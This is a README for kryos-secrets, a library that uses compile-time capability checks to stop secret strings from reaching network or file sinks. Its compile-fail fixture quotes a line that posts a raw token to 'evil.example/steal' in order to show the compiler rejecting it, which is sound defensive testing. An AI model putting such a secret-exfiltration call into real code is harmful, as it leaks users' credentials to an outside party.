# kryos-secrets

A `Secret` handle for `str` values whose raw contents cannot reach a `net` or
`io` sink unless the function that ships them explicitly declared the
capability. Under `kryos check --strict-capabilities`, an accidental
secret-to-network path that nobody annotated becomes a **compile-time
attenuation error**, not a runtime surprise.

Vault SDKs and 1Password libraries protect secret *storage*. kryos-secrets
makes a different, complementary guarantee: "this secret cannot leave a
compute-only function" is a property the compiler enforces.

## The idea

A `Secret` wraps a sensitive string (API key, DB password, session token).
The raw bytes only escape through `expose` / `expose_int`, which hand the
value to a closure that runs in the **caller's capability scope**. So:

- A function annotated `@capabilities()` (compute-only) can `expose` a secret
  and compute over it (hash it, compare it, mask it) — but it physically
  cannot pass the exposed value to `http2_post` / `tcp_send` / `file_write`,
  because under strict mode the compiler rejects the gated call (E0505).
- A function that declares `@capabilities(net)` *can* ship the secret. The
  capability annotation is the audit trail: you can see, on the function
  signature, that this code is allowed to exfiltrate.

Redaction (`redacted`) is the only rendering that ever touches a log line —
it returns the label and byte length, never the value.

This is a thin, deliberate MVP: a plain `Secret` struct specialized to a
`str` payload (generic `Secret<T>` method ergonomics are limited in the
current toolchain), plus a handful of pure-compute combinators and one
`process`-gated environment constructor.

## API

From `src/secret.kry` (`use secret`):

| Function | Capability | Purpose |
| --- | --- | --- |
| `secret_of(value: str, label: str) -> Secret` | compute | Wrap a literal value (tests, values already in hand). |
| `secret_from_env(key: str) -> Secret` | **process** | Read a secret from an environment variable (`env_get` is gated on `process`). |
| `redacted(s: Secret) -> str` | compute | Safe-to-log rendering: `Secret(<label>, <n> bytes)`. Never the value. |
| `secret_label(s: Secret) -> str` | compute | The non-sensitive label. |
| `secret_len(s: Secret) -> i64` | compute | Byte length of the value, without revealing it. |
| `expose(s: Secret, f: fn(str) -> str) -> str` | compute | Run a closure over the raw value, returning a str. |
| `expose_int(s: Secret, f: fn(str) -> i64) -> i64` | compute | Run a closure over the raw value, returning an i64. |
| `secrets_equal(a: Secret, b: Secret) -> bool` | compute | Value equality without revealing either value. |

`expose`/`expose_int` are pure compute themselves — they only forward the raw
value into the closure. The closure inherits the *caller's* capability scope,
which is where the enforcement happens.

## How the guarantee works

The Kryos capability checker maps capability-gated builtins to capabilities
(`http2_post`, `tcp_send`, ... → `net`; `file_write`, ... → `io`; `env_get`
→ `process`). Under `--strict-capabilities`, every function is treated as if
it carried an explicit `@capabilities(...)` annotation — an unannotated
function holds the **empty** set. So a call to a `net` builtin from a function
that never declared `net` is an error:

- `E0505` — a gated *builtin* called from a scope that lacks the capability.
- `E0507` — a gated *function* called from a caller that lacks the capability
  (the cross-function propagation case).

Because `expose` hands the raw value into the calling scope, the value's reach
is bounded by that scope's declared capabilities. Compute-only in, compute-only
out.

## Run it

The examples below use whichever `kryos` binary is on your `PATH`. (The
toolchain that produced this project's evidence was the `1.0.0-beta.1` debug
build, which is where `--strict-capabilities` landed.)

### Happy path

```
kryos run ecosystem/kryos-secrets/demo_secret.kry
```

```
loaded: Secret(api_key, 16 bytes)
label:  api_key
length: 16
masked: s******
checksum: 1356
env:    Secret(KRYOS_SECRETS_DEMO_TOKEN, 0 bytes)
equal:  api_key matches copy
```

The raw value `sk-live-7f3a9c2e` never appears in the output.

### The allowed-exfiltration path (declares `net`)

```
kryos run ecosystem/kryos-secrets/demo_exfil.kry
kryos check --strict-capabilities ecosystem/kryos-secrets/demo_exfil.kry   # 0 errors
```

`main -> ship_secret -> upload` all declare `@capabilities(net)`, so the
secret is allowed to leave. Strip `net` from any of them and the build breaks.

## Compile-fail fixture (the negative half)

`tests/fixtures/leak_compute.kry` is a compute-only function that tries to
ship a secret to `http2_post`. It is **supposed to fail** strict checking:

```
kryos check --strict-capabilities ecosystem/kryos-secrets/tests/fixtures/leak_compute.kry
```

```
error[E0505]: builtin `http2_post` requires `net` capability
 --> tests/fixtures/leak_compute.kry:37:36
   37 |     return expose_int(token, |raw| http2_post("https://evil.example/steal", raw))
      |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ requires `net`
   = note: add `@capabilities(net)` to the enclosing function or actor
error: check failed: 1 error, 0 warnings
```

Without `--strict-capabilities` the same file checks clean (exit 0) — an
unannotated function is "ambient", which is exactly the laxness strict mode
removes. That contrast is the product: flip strict on, and an undeclared
secret-to-net path is a build error.

A compiler rejection cannot be asserted from inside a running `@test` (the
test would have to invoke the compiler on itself), so the fixture is verified
at the CLI and its output is pasted into the PR evidence. The runtime
invariants (redaction never leaks, `expose` sees the real value, equality)
are covered by the `@test` functions in `tests/test_secret.kry`.

## Tests

```
kryos test --path ecosystem/kryos-secrets
```

Seven `@test` functions in `tests/test_secret.kry` cover redaction safety,
`expose`/`expose_int`, metadata accessors, value equality, and the env
constructor.

## MVP scope

In scope (built here):

- `Secret` opaque handle over a `str` payload.
- Literal constructor (`secret_of`) and env constructor (`secret_from_env`,
  `process`-gated).
- `expose` / `expose_int` capability-scoped escape hatches.
- `redacted` / `secret_label` / `secret_len` / `secrets_equal`.
- A runnable happy-path demo, a runnable allowed-exfiltration demo, and a
  compile-fail fixture that errors with E0505 under strict mode.

Deferred (out of scope for the MVP, per the project spec):

- **Memory zeroization.** The ARC model can't guarantee the raw bytes are
  wiped, so we do not claim it.
- **Real secret-manager backends** (Vault, cloud KMS, 1Password).
- **Secret rotation.**

## Notes and honest limitations

- The type is `Secret` specialized to a `str` payload, not a generic
  `Secret<T>`. Generic-struct method ergonomics are limited in the current
  toolchain (a method returning a bare type parameter reads a raw i64 slot),
  and the project spec anticipated this specialization. `str` is the dominant
  secret shape.
- The enforcement is a **dataflow capability** property, not encryption. The
  raw bytes live in memory in the clear; what the compiler guarantees is that
  they cannot reach a `net`/`io` sink from a scope that didn't declare the
  capability.
- `expose` deliberately does not stop you from `println`-ing the raw value
  inside a compute closure — `println` is not capability-gated. The guarantee
  is specifically about the `net`/`io`/`process` sinks the capability system
  tracks. Use `redacted` for logging.
- The strict-mode error code is `E0505` (gated builtin) — the spec also
  allows `E0503`; `E0507` is what you get for the cross-function variant.

## License

Apache-2.0. See `LICENSE`.
